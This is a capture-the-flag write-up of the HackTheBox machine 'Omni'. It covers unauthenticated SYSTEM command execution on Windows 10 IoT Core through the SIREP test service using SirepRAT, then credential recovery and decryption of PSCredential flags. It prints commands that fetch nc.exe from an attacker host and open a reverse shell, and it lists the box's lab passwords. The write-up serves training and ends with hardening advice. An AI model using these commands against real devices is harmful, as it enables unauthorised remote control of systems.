---
title: "Omni"
date: 2020-11-28
type: docs
tags:
  - htb
  - windows
  - easy
  - windows-iot
  - sirep
  - sireprat
  - unauthenticated-rce
  - iot-dashboard
  - import-clixml
  - pscredential
  - retired
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Windows 10 IoT Core, **Difficulty:** Easy, **Released:** 2020-11-28, **IP:** `10.10.10.204` , `omni.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. **Windows 10 IoT Core** device. The **SIREP / WPCon** test service on **port 29820** allows **unauthenticated command execution**.
2. Use **SirepRAT** to run commands, download `nc.exe` into a writable dir (`C:\Windows\System32\spool\drivers\color`), and catch a SYSTEM shell.
3. The IoT Device Portal (`:8080`) and `C:\Windows\System32\config\...\iot-admin.xml` hold credentials for **`app`** (`mesh5143`) and **`administrator`** (`_1nt3rn37ofth1nGz`).
4. Both flags are `Export-CliXml` **PSCredential** files. Run PowerShell **as the matching user** (SirepRAT + `runas` / `Start-Process -Credential`) and `Import-CliXml` to decrypt them.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `iot-admin.xml` | `app : mesh5143` |
| `iot-admin.xml` | `administrator : _1nt3rn37ofth1nGz` |
| `user.txt` | decrypt the PSCredential in `C:\Data\Users\app\` as `app` |
| `root.txt` | decrypt the PSCredential in `C:\Data\Users\administrator\` as `administrator` |

</div>

---

## Overview

Omni is the "Windows IoT Core" box, and it exists to teach one very specific, very real piece of tradecraft: the **SIREP service**. Windows 10 IoT Core ships a test and provisioning service on ports 29817 through 29820 that, whenever the device is left in test mode, lets a developer machine push files and run commands with no authentication whatsoever, executing everything as SYSTEM. That's the kind of thing that sounds implausible until you see it working against a live target, and the first time I got `whoami` back as `nt authority\system` without ever sending a credential, it drove home just how much embedded and IoT firmware quietly ships with debug interfaces its developers never expected to reach production. `SirepRAT` is the tool that weaponizes this protocol into something usable, and once I had a SYSTEM shell through it, the rest of the box turned into a credential hunt through the IoT Device Portal's configuration store. The final twist is a Windows-specific gotcha I appreciated: the flags on this box aren't plaintext, they're `Export-CliXml`-serialized `PSCredential` objects, which are encrypted with DPAPI and scoped to whichever account exported them. Reading them isn't a matter of finding the right file, it's a matter of being the right user when I open it.

Related unauthenticated device/service RCE: [Antique](/writeups/hackthebox/linux/easy/antique/) (JetDirect), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/) (gdbserver), [PC](/writeups/hackthebox/linux/easy/pc/) (gRPC). Related `Import-CliXml` / PSCredential: [POV](/writeups/hackthebox/windows/medium/pov/).

---

## Full Walkthrough

### Recon

```console
Open 10.10.10.204:135
Open 10.10.10.204:5985     # WinRM
Open 10.10.10.204:8080     # Windows Device Portal (auth required)
Open 10.10.10.204:29817
Open 10.10.10.204:29819
Open 10.10.10.204:29820
```

The port list itself was the giveaway: 135, WinRM, and a Device Portal on 8080 all screamed "Windows," but the trio of high ports in the 29800s isn't something I see on a standard Windows Server build, and that's what told me I was up against IoT Core specifically. `http://omni.htb:8080/` came back with a flat "Authorization Required," a dead end for the moment, so I turned my attention to the unfamiliar ports instead. Probing 29820 got me a fixed 16-byte binary response to any request I threw at it, consistent and predictable, which is the handshake behavior of the **SIREP** protocol.

### Foothold, SirepRAT

<div class="callout callout-note">

**SIREP / WPCon**

Windows 10 IoT Core in test mode runs `SirepServer`, the same service Visual Studio uses under the hood to deploy and debug applications on the device during development. It exposes RPC-like verbs, `LaunchCommandWithOutput`, `GetFileFromDevice`, `PutFileOnDevice`, `GetSystemInformation`, over TCP 29820 with absolutely no authentication, and every command it runs executes as **SYSTEM**. It's essentially a debug backdoor that was never supposed to survive into a deployed device. SafeBreach's [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT) implements a working client for it, which meant I didn't have to speak the protocol by hand.

</div>

I started simple, just to confirm the theory and see what user context I was actually landing in:

```bash
python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" --args " /c whoami"
# nt authority\system
```

SYSTEM, unauthenticated, on the first try. From there getting an interactive shell was just a matter of finding somewhere writable to stage a payload. `C:\Windows\System32\spool\drivers\color` turned out to be world-writable, which is a location I've seen abused on more than one Windows box for exactly this reason, so I used it to drop a netcat binary and then execute it:

```bash
python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" \
  --args " /c powershell iwr -uri http://10.10.14.26/nc.exe -o C:\Windows\System32\spool\drivers\color\nc.exe"
python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" \
  --args " /c C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.26 9001"
```

```console
rlwrap nc -lnvp 9001
Microsoft Windows [Version 10.0.17763.107]
C:\windows\system32>
```

(My notes then chased NetNTLM over `smbserver.py`, which is a dead end here, SYSTEM already has what you need.)

### Credentials, IoT Device Portal config

With a SYSTEM shell already in hand, my next goal was simply finding where the Device Portal stored its user database, since that's the piece guarding port 8080 that I hadn't been able to touch from the outside:

```console
type C:\Windows\System32\config\systemprofile\AppData\Local\...\iot-admin.xml
# or   C:\Data\Users\System\...   (path varies by image)
```

```xml
<userdatabase>
  <user username="app"><password>mesh5143</password></user>
  <user username="administrator"><password>_1nt3rn37ofth1nGz</password></user>
</userdatabase>
```

(These also work to log into `:8080` / WinRM.)

### The flags are encrypted PSCredentials

Armed with both sets of credentials, I expected the flags to be a formality. Reading `user.txt` said otherwise:

```console
type C:\Data\Users\app\user.txt
# <Objs ...><Obj RefId="0"><TN><T>System.Management.Automation.PSCredential</T>...
```

That's not a flag string, it's a serialized .NET object, which meant I needed to actually understand how PowerShell had encrypted it before I could get anything readable out of it.

<div class="callout callout-note">

**`Import-CliXml` needs the right user**

`Export-CliXml` run against a `PSCredential` doesn't just serialize the password, it protects it with **DPAPI scoped to the exporting user's account**. DPAPI keys are derived from the user's own credentials, so decryption only works for whoever (or whatever process) is running as that same user. Practically, that means reading `user.txt` requires running `Import-CliXml` **as `app`**, and reading `root.txt` requires running it **as `administrator`**; my SYSTEM shell, despite being the most privileged account on the box, can't decrypt either one directly. The workaround is to spawn a new PowerShell process under the target user's context using the credentials I'd already recovered, then run the import inside that process. From the SYSTEM shell:
```powershell
$p = ConvertTo-SecureString 'mesh5143' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('omni\app',$p)
Start-Process powershell -Credential $c -ArgumentList '-c','(Import-CliXml C:\Data\Users\app\user.txt).GetNetworkCredential().Password | Out-File C:\Data\Users\app\out.txt'
type C:\Data\Users\app\out.txt
```
Repeat the same pattern with the `administrator` credential to get `root.txt`. In hindsight, evil-winrm logged in directly as each user is a cleaner path to the same result: `evil-winrm -i omni.htb -u administrator -p '_1nt3rn37ofth1nGz'` and then `Import-CliXml` runs natively in that user's own session.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `C:\Data\Users\app\user.txt` (PSCredential, decrypt as `app`) |
| `root.txt` | `C:\Data\Users\administrator\root.txt` (PSCredential, decrypt as `administrator`) |

---

## Lessons and Takeaways

Omni is a short box, but it packs in a genuinely useful set of takeaways for anything embedded or IoT-adjacent:

- **Take IoT Core devices out of test mode before they ever leave a development bench.** The SIREP service isn't a misconfiguration in the traditional sense, it's unauthenticated SYSTEM-level remote execution by design, intended for a trusted development network and never meant to be reachable once a device ships.
- **Segment IoT devices onto their own network.** They're rarely patched at the same cadence as general-purpose endpoints, and as this box shows, they often expose developer and debug services that a standard hardening checklist wouldn't think to look for.
- **Don't store administrative passwords in cleartext in the Device Portal's user database**, even though that's simply how the platform is built. If you can't change that behavior, the mitigation is restricting who and what can ever read that configuration file in the first place.
- **`Import-CliXml` and DPAPI-protected credential files are only as safe as the account that exported them.** If an attacker can obtain the ability to run code as that account, even briefly, those files stop being encrypted in any meaningful sense and become plaintext on demand.

---

## Related Writeups

- **Unauthenticated device / service RCE:** [Antique](/writeups/hackthebox/linux/easy/antique/), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [PC](/writeups/hackthebox/linux/easy/pc/)
- **`Import-CliXml` / PSCredential:** [POV](/writeups/hackthebox/windows/medium/pov/)
- **Config file with plaintext creds:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Previse](/writeups/hackthebox/linux/easy/previse/)

## References

- SirepRAT (SafeBreach) <https://github.com/SafeBreach-Labs/SirepRAT>
- HTB Omni (0xdf) <https://0xdf.gitlab.io/2021/01/09/htb-omni.html>
- Windows IoT Core SIREP research <https://www.safebreach.com/blog/2019/sirep-rat-remote-administration-tool-for-windows-iot/>
